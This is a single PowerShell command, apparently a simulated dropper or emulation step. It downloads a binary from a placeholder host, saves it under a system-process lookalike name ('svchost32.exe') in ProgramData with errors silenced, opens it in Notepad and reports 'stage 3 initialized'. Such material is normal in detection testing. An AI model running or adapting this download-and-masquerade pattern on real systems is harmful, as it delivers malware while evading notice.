
Invoke-WebRequest -Uri "http://example.com/cdn/stage2.bin" -OutFile 'C:\ProgramData\svchost32.exe' -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList 'C:\ProgramData\svchost32.exe' -ErrorAction SilentlyContinue; Write-Output "stage 3 initialized"
